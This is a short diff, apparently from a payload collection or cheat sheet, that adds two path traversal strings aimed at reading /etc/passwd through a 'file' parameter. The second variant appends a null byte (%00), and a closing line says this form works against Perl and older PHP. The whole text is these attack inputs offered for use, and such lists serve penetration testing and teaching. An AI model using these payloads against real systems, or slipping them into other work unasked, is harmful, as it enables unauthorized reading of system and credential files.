@@ -1,0 +1,5 @@
+file=../../../../../../etc/passwd
+or
+file=../../../../../../etc/passwd%00
+
+Perl and older versions of PHP.
